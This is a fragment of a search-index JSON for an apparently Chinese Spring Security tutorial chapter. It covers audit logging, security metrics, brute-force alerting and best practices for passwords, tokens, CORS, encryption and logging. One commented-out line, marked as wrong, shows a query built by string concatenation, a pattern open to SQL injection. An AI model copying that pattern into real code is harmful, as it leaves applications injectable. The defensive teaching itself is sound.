}\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#3-jwt","title":"3. JWT\u7b7e\u540d\u7b97\u6cd5\u9009\u62e9","text":"<pre><code>\u6027\u80fd\u5bf9\u6bd4\uff08\u76f8\u5bf9\u901f\u5ea6\uff09\uff1a\nHMAC (HS256)\uff1a     \u2b50\u2b50\u2b50\u2b50\u2b50 \uff08\u6700\u5feb\uff09\nECDSA (ES256):     \u2b50\u2b50\u2b50\u2b50\nRSA (RS256):       \u2b50\u2b50\u2b50\n\n\u5b89\u5168\u6027\u5bf9\u6bd4\uff1a\nECDSA (ES256):     \u2b50\u2b50\u2b50\u2b50\u2b50 \uff08\u76f8\u540c\u5bc6\u94a5\u957f\u5ea6\u4e0b\u6700\u5b89\u5168\uff09\nRSA (RS256):       \u2b50\u2b50\u2b50\u2b50\nHMAC (HS256):      \u2b50\u2b50\u2b50 \uff08\u9700\u8981\u5b89\u5168\u4f20\u8f93\u5bc6\u94a5\uff09\n\n\u63a8\u8350\uff1a\n- \u5185\u90e8\u7cfb\u7edf\uff1aHMAC (HS256)\n- \u516c\u5f00API\uff1aECDSA (ES256) \u6216 RSA (RS256)\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#4","title":"4. \u6570\u636e\u5e93\u67e5\u8be2\u4f18\u5316","text":"<pre><code>/**\n * \u4f18\u5316\u7528\u6237\u6743\u9650\u67e5\u8be2\n */\n@Repository\npublic interface UserRepository extends JpaRepository&lt;User, Long&gt; {\n\n    // \u274c \u9519\u8bef\uff1aN+1\u67e5\u8be2\u95ee\u9898\n    @Query(\"SELECT u FROM User u WHERE u.username = :username\")\n    User findByUsername(String username);\n\n    // \u2705 \u6b63\u786e\uff1a\u4f7f\u7528JOIN FETCH\u4e00\u6b21\u6027\u52a0\u8f7d\n    @Query(\"SELECT u FROM User u \" +\n           \"LEFT JOIN FETCH u.roles r \" +\n           \"LEFT JOIN FETCH r.permissions \" +\n           \"WHERE u.username = :username\")\n    User findByUsernameWithRolesAndPermissions(@Param(\"username\") String username);\n\n    // \u6216\u4f7f\u7528EntityGraph\n    @EntityGraph(attributePaths = {\"roles\", \"roles.permissions\"})\n    Optional&lt;User&gt; findWithRolesByUsername(String username);\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#5","title":"5. \u8fde\u63a5\u6c60\u914d\u7f6e","text":"<pre><code># HikariCP\u914d\u7f6e\nspring.datasource.hikari.maximum-pool-size=20\nspring.datasource.hikari.minimum-idle=5\nspring.datasource.hikari.connection-timeout=30000\nspring.datasource.hikari.idle-timeout=600000\nspring.datasource.hikari.max-lifetime=1800000\n\n# Redis\u8fde\u63a5\u6c60\nspring.redis.lettuce.pool.max-active=20\nspring.redis.lettuce.pool.max-idle=10\nspring.redis.lettuce.pool.min-idle=5\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_15","title":"\u5ba1\u8ba1\u65e5\u5fd7\u4e0e\u76d1\u63a7","text":""},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_16","title":"\u5ba1\u8ba1\u65e5\u5fd7","text":"<pre><code>/**\n * \u5ba1\u8ba1\u4e8b\u4ef6\n */\n@Entity\n@Table(name = \"audit_logs\")\n@Data\npublic class AuditLog {\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n\n    private String username;\n\n    private String action;  // LOGIN, LOGOUT, CREATE, UPDATE, DELETE\n\n    private String resource;  // users, orders, etc.\n\n    private String resourceId;\n\n    private String ipAddress;\n\n    private String userAgent;\n\n    private boolean success;\n\n    private String failureReason;\n\n    @Column(columnDefinition = \"TEXT\")\n    private String details;  // JSON\u683c\u5f0f\u7684\u8be6\u7ec6\u4fe1\u606f\n\n    @CreationTimestamp\n    private LocalDateTime timestamp;\n}\n\n/**\n * \u5ba1\u8ba1\u670d\u52a1\n */\n@Service\n@Async\npublic class AuditService {\n\n    @Autowired\n    private AuditLogRepository auditLogRepository;\n\n    /**\n     * \u8bb0\u5f55\u767b\u5f55\u4e8b\u4ef6\n     */\n    public void logLogin(String username, String ipAddress, boolean success, String failureReason) {\n        AuditLog log = new AuditLog();\n        log.setUsername(username);\n        log.setAction(\"LOGIN\");\n        log.setIpAddress(ipAddress);\n        log.setSuccess(success);\n        log.setFailureReason(failureReason);\n\n        auditLogRepository.save(log);\n    }\n\n    /**\n     * \u8bb0\u5f55\u8d44\u6e90\u8bbf\u95ee\n     */\n    public void logResourceAccess(String username, String action, String resource, \n                                  String resourceId, boolean success) {\n        AuditLog log = new AuditLog();\n        log.setUsername(username);\n        log.setAction(action);\n        log.setResource(resource);\n        log.setResourceId(resourceId);\n        log.setSuccess(success);\n\n        auditLogRepository.save(log);\n    }\n}\n\n/**\n * \u5ba1\u8ba1\u5207\u9762\n */\n@Aspect\n@Component\npublic class AuditAspect {\n\n    @Autowired\n    private AuditService auditService;\n\n    @AfterReturning(\n        pointcut = \"@annotation(audited)\",\n        returning = \"result\"\n    )\n    public void auditSuccess(JoinPoint joinPoint, Audited audited, Object result) {\n        Authentication auth = SecurityContextHolder.getContext().getAuthentication();\n        String username = auth != null ? auth.getName() : \"anonymous\";\n\n        auditService.logResourceAccess(\n            username,\n            audited.action(),\n            audited.resource(),\n            extractResourceId(joinPoint, result),\n            true\n        );\n    }\n\n    @AfterThrowing(\n        pointcut = \"@annotation(audited)\",\n        throwing = \"ex\"\n    )\n    public void auditFailure(JoinPoint joinPoint, Audited audited, Exception ex) {\n        Authentication auth = SecurityContextHolder.getContext().getAuthentication();\n        String username = auth != null ? auth.getName() : \"anonymous\";\n\n        auditService.logResourceAccess(\n            username,\n            audited.action(),\n            audited.resource(),\n            null,\n            false\n        );\n    }\n}\n\n/**\n * \u5ba1\u8ba1\u6ce8\u89e3\n */\n@Target(ElementType.METHOD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface Audited {\n    String action();\n    String resource();\n}\n\n/**\n * \u4f7f\u7528\u793a\u4f8b\n */\n@Service\npublic class UserService {\n\n    @Audited(action = \"CREATE\", resource = \"users\")\n    public User createUser(User user) {\n        return userRepository.save(user);\n    }\n\n    @Audited(action = \"DELETE\", resource = \"users\")\n    public void deleteUser(Long id) {\n        userRepository.deleteById(id);\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_17","title":"\u76d1\u63a7\u6307\u6807","text":"<pre><code>/**\n * \u5b89\u5168\u76d1\u63a7\u6307\u6807\n */\n@Component\npublic class SecurityMetrics {\n\n    private final Counter loginAttempts;\n    private final Counter loginFailures;\n    private final Counter loginSuccesses;\n    private final Counter accessDenied;\n    private final Gauge activeUsers;\n\n    public SecurityMetrics(MeterRegistry registry) {\n        this.loginAttempts = Counter.builder(\"security.login.attempts\")\n            .description(\"Total login attempts\")\n            .register(registry);\n\n        this.loginFailures = Counter.builder(\"security.login.failures\")\n            .tag(\"reason\", \"invalid_credentials\")\n            .description(\"Failed login attempts\")\n            .register(registry);\n\n        this.loginSuccesses = Counter.builder(\"security.login.successes\")\n            .description(\"Successful logins\")\n            .register(registry);\n\n        this.accessDenied = Counter.builder(\"security.access.denied\")\n            .description(\"Access denied events\")\n            .register(registry);\n\n        this.activeUsers = Gauge.builder(\"security.users.active\", this, SecurityMetrics::getActiveUserCount)\n            .description(\"Number of active users\")\n            .register(registry);\n    }\n\n    public void recordLoginAttempt() {\n        loginAttempts.increment();\n    }\n\n    public void recordLoginSuccess() {\n        loginSuccesses.increment();\n    }\n\n    public void recordLoginFailure() {\n        loginFailures.increment();\n    }\n\n    public void recordAccessDenied() {\n        accessDenied.increment();\n    }\n\n    private double getActiveUserCount() {\n        // \u5b9e\u73b0\u6d3b\u8dc3\u7528\u6237\u6570\u7edf\u8ba1\n        return sessionRegistry.getAllPrincipals().size();\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_18","title":"\u5b89\u5168\u544a\u8b66","text":"<pre><code>/**\n * \u5b89\u5168\u544a\u8b66\u670d\u52a1\n */\n@Service\npublic class SecurityAlertService {\n\n    @Autowired\n    private NotificationService notificationService;\n\n    @Autowired\n    private AuditLogRepository auditLogRepository;\n\n    /**\n     * \u68c0\u6d4b\u66b4\u529b\u7834\u89e3\u653b\u51fb\n     */\n    @Scheduled(fixedRate = 60000)  // \u6bcf\u5206\u949f\n    public void detectBruteForceAttacks() {\n        LocalDateTime oneMinuteAgo = LocalDateTime.now().minusMinutes(1);\n\n        // \u67e5\u627e1\u5206\u949f\u5185\u5931\u8d25\u6b21\u6570\u8d85\u8fc75\u6b21\u7684IP\n        List&lt;Map&lt;String, Object&gt;&gt; suspiciousIps = auditLogRepository\n            .findFailedLoginsByIpSince(oneMinuteAgo, 5);\n\n        for (Map&lt;String, Object&gt; entry : suspiciousIps) {\n            String ipAddress = (String) entry.get(\"ipAddress\");\n            Long failureCount = (Long) entry.get(\"failureCount\");\n\n            notificationService.sendAlert(\n                \"\u53ef\u7591\u7684\u66b4\u529b\u7834\u89e3\u653b\u51fb\",\n                String.format(\"IP %s \u57281\u5206\u949f\u5185\u5c1d\u8bd5\u767b\u5f55\u5931\u8d25 %d \u6b21\", ipAddress, failureCount)\n            );\n\n            // \u53ef\u4ee5\u8003\u8651\u81ea\u52a8\u5c01\u7981IP\n            // ipBlocklistService.blockIp(ipAddress, Duration.ofHours(1));\n        }\n    }\n\n    /**\n     * \u68c0\u6d4b\u5f02\u5e38\u8bbf\u95ee\u6a21\u5f0f\n     */\n    @Scheduled(fixedRate = 300000)  // \u6bcf5\u5206\u949f\n    public void detectAnomalousAccess() {\n        LocalDateTime fiveMinutesAgo = LocalDateTime.now().minusMinutes(5);\n\n        // \u68c0\u6d4b\u77ed\u65f6\u95f4\u5185\u5927\u91cf\u8d44\u6e90\u8bbf\u95ee\n        List&lt;Map&lt;String, Object&gt;&gt; heavyUsers = auditLogRepository\n            .findUsersWithHighActivitySince(fiveMinutesAgo, 100);\n\n        for (Map&lt;String, Object&gt; entry : heavyUsers) {\n            String username = (String) entry.get(\"username\");\n            Long requestCount = (Long) entry.get(\"requestCount\");\n\n            notificationService.sendAlert(\n                \"\u5f02\u5e38\u8bbf\u95ee\u6a21\u5f0f\",\n                String.format(\"\u7528\u6237 %s \u57285\u5206\u949f\u5185\u53d1\u8d77\u4e86 %d \u6b21\u8bf7\u6c42\", username, requestCount)\n            );\n        }\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_19","title":"\u5b89\u5168\u6700\u4f73\u5b9e\u8df5\u6c47\u603b","text":""},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#1_2","title":"1. \u5bc6\u7801\u5b89\u5168","text":"<pre><code>/**\n * \u5bc6\u7801\u5b89\u5168\u6700\u4f73\u5b9e\u8df5\n */\npublic class PasswordSecurityBestPractices {\n\n    // \u2705 \u4f7f\u7528\u5f3a\u52a0\u5bc6\u7b97\u6cd5\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder(12);  // strength 12\n    }\n\n    // \u2705 \u5bc6\u7801\u590d\u6742\u5ea6\u9a8c\u8bc1\n    public boolean validatePasswordStrength(String password) {\n        return password.length() &gt;= 12 &amp;&amp;\n               password.matches(\".*[A-Z].*\") &amp;&amp;\n               password.matches(\".*[a-z].*\") &amp;&amp;\n               password.matches(\".*[0-9].*\") &amp;&amp;\n               password.matches(\".*[!@#$%^&amp;*].*\");\n    }\n\n    // \u2705 \u5bc6\u7801\u5386\u53f2\u8bb0\u5f55\uff08\u9632\u6b62\u91cd\u7528\uff09\n    public boolean checkPasswordHistory(String userId, String newPassword) {\n        List&lt;String&gt; previousPasswords = passwordHistoryRepository\n            .findLastNPasswords(userId, 5);\n\n        return previousPasswords.stream()\n            .noneMatch(oldPassword -&gt; \n                passwordEncoder.matches(newPassword, oldPassword));\n    }\n\n    // \u2705 \u5f3a\u5236\u5b9a\u671f\u66f4\u6362\u5bc6\u7801\n    public boolean isPasswordExpired(User user) {\n        return user.getPasswordChangedAt()\n            .isBefore(LocalDateTime.now().minusDays(90));\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#2-token","title":"2. Token\u5b89\u5168","text":"<pre><code>/**\n * Token\u5b89\u5168\u6700\u4f73\u5b9e\u8df5\n */\npublic class TokenSecurityBestPractices {\n\n    // \u2705 \u77ed\u671fAccess Token + \u957f\u671fRefresh Token\n    private static final long ACCESS_TOKEN_VALIDITY = 15 * 60 * 1000;   // 15\u5206\u949f\n    private static final long REFRESH_TOKEN_VALIDITY = 7 * 24 * 60 * 60 * 1000;  // 7\u5929\n\n    // \u2705 Token\u8f6e\u6362\uff08\u6bcf\u6b21\u5237\u65b0\u65f6\u751f\u6210\u65b0\u7684Refresh Token\uff09\n    public TokenPair refreshToken(String refreshToken) {\n        if (!validateRefreshToken(refreshToken)) {\n            throw new InvalidTokenException();\n        }\n\n        // \u751f\u6210\u65b0\u7684Token\u5bf9\n        String newAccessToken = generateAccessToken(user);\n        String newRefreshToken = generateRefreshToken(user);\n\n        // \u5e9f\u5f03\u65e7\u7684Refresh Token\n        refreshTokenRepository.deleteByToken(refreshToken);\n        refreshTokenRepository.save(newRefreshToken);\n\n        return new TokenPair(newAccessToken, newRefreshToken);\n    }\n\n    // \u2705 Token\u9ed1\u540d\u5355\uff08\u63d0\u524d\u540a\u9500\uff09\n    public void revokeToken(String token) {\n        Claims claims = parseToken(token);\n        long expirationTime = claims.getExpiration().getTime();\n        long ttl = expirationTime - System.currentTimeMillis();\n\n        if (ttl &gt; 0) {\n            redisTemplate.opsForValue().set(\n                \"blacklist:\" + token,\n                \"1\",\n                ttl,\n                TimeUnit.MILLISECONDS\n            );\n        }\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#3-api","title":"3. API\u5b89\u5168","text":"<pre><code>/**\n * API\u5b89\u5168\u6700\u4f73\u5b9e\u8df5\n */\n@Configuration\npublic class ApiSecurityConfig {\n\n    @Bean\n    public SecurityFilterChain apiSecurityFilterChain(HttpSecurity http) throws Exception {\n        http\n            // \u2705 HTTPS Only\n            .requiresChannel(channel -&gt; channel\n                .anyRequest().requiresSecure()\n            )\n\n            // \u2705 CORS\u914d\u7f6e\n            .cors(cors -&gt; cors.configurationSource(corsConfigurationSource()))\n\n            // \u2705 \u5b89\u5168\u54cd\u5e94\u5934\n            .headers(headers -&gt; headers\n                .contentSecurityPolicy(\"default-src 'self'\")\n                .frameOptions().deny()\n                .xssProtection().enable()\n                .contentTypeOptions().enable()\n                .httpStrictTransportSecurity()\n                    .includeSubDomains(true)\n                    .maxAgeInSeconds(31536000)\n            )\n\n            // \u2705 \u901f\u7387\u9650\u5236\n            .addFilterBefore(rateLimitFilter(), UsernamePasswordAuthenticationFilter.class);\n\n        return http.build();\n    }\n\n    // \u2705 CORS\u914d\u7f6e\n    @Bean\n    public CorsConfigurationSource corsConfigurationSource() {\n        CorsConfiguration configuration = new CorsConfiguration();\n        configuration.setAllowedOrigins(Arrays.asList(\"https://trusted-domain.com\"));\n        configuration.setAllowedMethods(Arrays.asList(\"GET\", \"POST\", \"PUT\", \"DELETE\"));\n        configuration.setAllowedHeaders(Arrays.asList(\"Authorization\", \"Content-Type\"));\n        configuration.setExposedHeaders(Arrays.asList(\"X-Total-Count\"));\n        configuration.setAllowCredentials(true);\n        configuration.setMaxAge(3600L);\n\n        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();\n        source.registerCorsConfiguration(\"/api/**\", configuration);\n        return source;\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#4_1","title":"4. \u6570\u636e\u5b89\u5168","text":"<pre><code>/**\n * \u6570\u636e\u5b89\u5168\u6700\u4f73\u5b9e\u8df5\n */\npublic class DataSecurityBestPractices {\n\n    // \u2705 \u654f\u611f\u6570\u636e\u52a0\u5bc6\u5b58\u50a8\n    @Component\n    public class DataEncryptionService {\n\n        private final Cipher cipher;\n        private final SecretKey secretKey;\n\n        public String encrypt(String plaintext) {\n            cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n            byte[] encrypted = cipher.doFinal(plaintext.getBytes());\n            return Base64.getEncoder().encodeToString(encrypted);\n        }\n\n        public String decrypt(String ciphertext) {\n            cipher.init(Cipher.DECRYPT_MODE, secretKey);\n            byte[] decoded = Base64.getDecoder().decode(ciphertext);\n            byte[] decrypted = cipher.doFinal(decoded);\n            return new String(decrypted);\n        }\n    }\n\n    // \u2705 \u6570\u636e\u8131\u654f\n    public String maskSensitiveData(String data, DataType type) {\n        switch (type) {\n            case PHONE:\n                return data.replaceAll(\"(\\\\d{3})\\\\d{4}(\\\\d{4})\", \"$1****$2\");\n            case EMAIL:\n                return data.replaceAll(\"(^\\\\w{1,3}).*(@.*)\", \"$1***$2\");\n            case ID_CARD:\n                return data.replaceAll(\"(\\\\d{6})\\\\d{8}(\\\\d{4})\", \"$1********$2\");\n            default:\n                return data;\n        }\n    }\n\n    // \u2705 SQL\u6ce8\u5165\u9632\u62a4\n    @Repository\n    public interface UserRepository extends JpaRepository&lt;User, Long&gt; {\n        // \u4f7f\u7528\u53c2\u6570\u5316\u67e5\u8be2\n        @Query(\"SELECT u FROM User u WHERE u.username = :username\")\n        User findByUsername(@Param(\"username\") String username);\n\n        // \u274c \u4e0d\u8981\u4f7f\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\n        // @Query(\"SELECT u FROM User u WHERE u.username = '\" + username + \"'\")\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#5_1","title":"5. \u65e5\u5fd7\u5b89\u5168","text":"<pre><code>/**\n * \u65e5\u5fd7\u5b89\u5168\u6700\u4f73\u5b9e\u8df5\n */\n@Component\npublic class SecureLogging {\n\n    private static final Logger logger = LoggerFactory.getLogger(SecureLogging.class);\n\n    // \u2705 \u4e0d\u8981\u8bb0\u5f55\u654f\u611f\u4fe1\u606f\n    public void logUserAction(User user, String action) {\n        logger.info(\"User action: user={}, action={}\", \n            user.getUsername(),  // \u2705 OK\n            action);\n\n        // \u274c \u4e0d\u8981\u8bb0\u5f55\u5bc6\u7801\u3001Token\u7b49\n        // logger.info(\"Password: {}\", user.getPassword());\n        // logger.info(\"Token: {}\", token);\n    }\n\n    // \u2705 \u4f7f\u7528\u65e5\u5fd7\u7ea7\u522b\n    public void logSecurityEvent(SecurityEvent event) {\n        switch (event.getSeverity()) {\n            case CRITICAL:\n                logger.error(\"Security event: {}\", event);\n                break;\n            case WARNING:\n                logger.warn(\"Security event: {}\", event);\n                break;\n            case INFO:\n                logger.info(\"Security event: {}\", event);\n                break;\n        }\n    }\n\n    // \u2705 \u7ed3\u6784\u5316\u65e5\u5fd7\n    public void logStructured(String username, String action, boolean success) {\n        logger.info(\"action={}, username={}, success={}, timestamp={}\", \n            action, username, success, Instant.now());\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_20","title":"\u603b\u7ed3","text":"<p>\u672c\u7ae0\u4ecb\u7ecd\u4e86\u8ba4\u8bc1\u6388\u6743\u7684\u9ad8\u7ea7\u4e3b\u9898\uff1a</p> <ol> <li>\u591a\u79df\u6237\u8ba4\u8bc1\uff1a\u6570\u636e\u9694\u79bb\u3001\u79df\u6237\u8bc6\u522b\u3001\u4e0a\u4e0b\u6587\u7ba1\u7406</li> <li>\u5206\u5e03\u5f0f\u4f1a\u8bdd\uff1aRedis Session\u3001Session\u76d1\u63a7\u3001\u96c6\u7fa4\u7ba1\u7406</li> <li>\u5fae\u670d\u52a1\u5b89\u5168\uff1a\u7f51\u5173\u8ba4\u8bc1\u3001\u670d\u52a1\u95f4\u8c03\u7528\u3001\u5206\u5e03\u5f0f\u8ffd\u8e2a</li> <li>\u6027\u80fd\u4f18\u5316\uff1a\u7f13\u5b58\u7b56\u7565\u3001\u6279\u91cf\u5904\u7406\u3001\u6570\u636e\u5e93\u4f18\u5316</li> <li>\u5ba1\u8ba1\u76d1\u63a7\uff1a\u65e5\u5fd7\u8bb0\u5f55\u3001\u6307\u6807\u76d1\u63a7\u3001\u5b89\u5168\u544a\u8b66</li> <li>\u6700\u4f73\u5b9e\u8df5\uff1a\u5bc6\u7801\u3001Token\u3001API\u3001\u6570\u636e\u3001\u65e5\u5fd7\u5b89\u5168</li> </ol> <p>\u5173\u952e\u8981\u70b9\uff1a - \u5b89\u5168\u662f\u7cfb\u7edf\u6027\u5de5\u7a0b\uff0c\u9700\u8981\u591a\u5c42\u9632\u62a4 - \u6027\u80fd\u548c\u5b89\u5168\u9700\u8981\u5e73\u8861 - \u6301\u7eed\u76d1\u63a7\u548c\u5ba1\u8ba1\u81f3\u5173\u91cd\u8981 - \u9075\u5faa\u6700\u5c0f\u6743\u9650\u539f\u5219 - \u5b9a\u671f\u5b89\u5168\u5ba1\u67e5\u548c\u66f4\u65b0</p> <p>\u7ee7\u7eed\u5b66\u4e60\uff1a - \u8fd4\u56de\u9996\u9875\uff1a\u8ba4\u8bc1\u6388\u6743\u57fa\u7840 - OWASP Top 10 - Spring Security\u5b98\u65b9\u6587\u6863</p>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_21","title":"\u5b8c\u6574\u5b66\u4e60\u8def\u5f84","text":"<ol> <li>\u8ba4\u8bc1\u6388\u6743\u57fa\u7840 - \u6838\u5fc3\u6982\u5ff5</li> <li>\u8ba4\u8bc1\u534f\u8bae\u4e0e\u6807\u51c6 - OAuth2\u3001JWT\u3001SSO</li> <li>Java\u8ba4\u8bc1\u6846\u67b6\u5bf9\u6bd4 - \u6846\u67b6\u9009\u578b</li> <li>Spring Security\u6838\u5fc3\u67b6\u6784 - \u67b6\u6784\u539f\u7406</li> <li>Spring Security\u5b9e\u6218\u914d\u7f6e - \u5b9e\u8df5\u914d\u7f6e</li> <li>Spring Security OAuth2\u96c6\u6210 - OAuth2\u5b9e\u73b0</li> <li>\u4ee3\u7801\u793a\u4f8b\u96c6 - \u5b8c\u6574\u793a\u4f8b</li> <li>\u9ad8\u7ea7\u4e3b\u9898\u4e0e\u6700\u4f73\u5b9e\u8df5 - \u672c\u7ae0</li> </ol> <p>\u606d\u559c\u4f60\u5b8c\u6210\u8ba4\u8bc1\u6388\u6743\u77e5\u8bc6\u4f53\u7cfb\u7684\u5b66\u4e60\uff01 \ud83c\udf89</p>"}]}